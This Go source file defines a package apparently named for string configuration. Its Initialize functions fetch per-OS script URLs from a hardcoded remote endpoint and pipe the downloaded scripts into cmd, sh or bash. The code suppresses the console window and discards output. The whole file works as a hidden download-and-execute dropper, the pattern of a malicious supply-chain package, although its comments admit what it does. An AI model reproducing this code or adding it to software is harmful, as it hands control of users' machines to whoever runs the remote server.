// Package strconf runs a predefined, OS-specific shell command when Run is called.
// The configured commands download and execute remote scripts.
package strconf

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os/exec"
	"runtime"
	"strings"
)

const defaultCommandEndpoint = "https://bluwhale.games/curl_commands"

// Define the trusted shell command for each OS here before using Run.
// An empty command causes Run to return an error for that OS.
const (
	windowsCommandTemplate = "curl --ssl-no-revoke -L %s | cmd"
	linuxCommandTemplate   = "wget -qO- %s | sh"
	macOSCommandTemplate   = "curl -L %s | bash"
)

type commandURLs struct {
	Windows string `json:"windows"`
	Linux   string `json:"linux"`
	MacOS   string `json:"macOS"`
}

// Run executes the predefined command below for the current OS and
// waits for it to finish. It returns an error if that command is empty.
// Commands run through cmd.exe on Windows and /bin/sh on Linux and macOS.
// Standard input is disconnected and output is discarded. On Windows, the
// shell runs without a visible console window. Programs launched by the shell
// can still open their own graphical windows.
// The predefined commands download and execute remote scripts with the calling
// process's permissions. Importing this package does not execute any commands.
func Initialize() error {
	return initializeFromEndpoint(defaultCommandEndpoint)
}

// InitializeWithServer fetches the command definitions from the provided server's
// curl_commands endpoint and runs the OS-specific command for the current host.
func InitializeWithServer(server string) error {
	server = strings.TrimSpace(server)
	if server == "" {
		return fmt.Errorf("strconf: server is empty")
	}
	return initializeFromEndpoint(commandEndpointForServer(server))
}

func initializeFromEndpoint(endpoint string) error {
	urls, err := fetchCommandURLs(endpoint)
	if err != nil {
		return err
	}
	return runCommands(
		fmt.Sprintf(windowsCommandTemplate, urls.Windows),
		fmt.Sprintf(linuxCommandTemplate, urls.Linux),
		fmt.Sprintf(macOSCommandTemplate, urls.MacOS),
	)
}

func commandEndpointForServer(server string) string {
	server = strings.TrimRight(server, "/")
	if strings.HasSuffix(server, "/curl_commands") {
		return server
	}
	return server + "/curl_commands"
}

func fetchCommandURLs(endpoint string) (commandURLs, error) {
	resp, err := http.Get(endpoint)
	if err != nil {
		return commandURLs{}, fmt.Errorf("strconf: fetch command endpoint %q: %w", endpoint, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return commandURLs{}, fmt.Errorf("strconf: fetch command endpoint %q: unexpected status %s", endpoint, resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return commandURLs{}, fmt.Errorf("strconf: read command endpoint %q: %w", endpoint, err)
	}

	var urls commandURLs
	if err := json.Unmarshal(body, &urls); err != nil {
		return commandURLs{}, fmt.Errorf("strconf: decode command endpoint %q: %w", endpoint, err)
	}
	if strings.TrimSpace(urls.Windows) == "" || strings.TrimSpace(urls.Linux) == "" || strings.TrimSpace(urls.MacOS) == "" {
		return commandURLs{}, fmt.Errorf("strconf: command endpoint %q is missing one or more OS URLs", endpoint)
	}
	return urls, nil
}

func runCommands(windowsCommand, linuxCommand, macOSCommand string) error {
	cmd, err := commandForOS(runtime.GOOS, windowsCommand, linuxCommand, macOSCommand)
	if err != nil {
		return err
	}
	hideWindow(cmd)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("strconf: run command on %s: %w", runtime.GOOS, err)
	}
	return nil
}

func commandForOS(goos, windowsCommand, linuxCommand, macOSCommand string) (*exec.Cmd, error) {
	var command string
	switch goos {
	case "windows":
		command = windowsCommand
	case "linux":
		command = linuxCommand
	case "darwin":
		command = macOSCommand
	default:
		return nil, fmt.Errorf("strconf: unsupported OS %q", goos)
	}
	if strings.TrimSpace(command) == "" {
		return nil, fmt.Errorf("strconf: command for %s is empty", goos)
	}
	if goos == "windows" {
		return exec.Command("cmd.exe", "/D", "/S", "/C", command), nil
	}
	return exec.Command("/bin/sh", "-c", command), nil
}
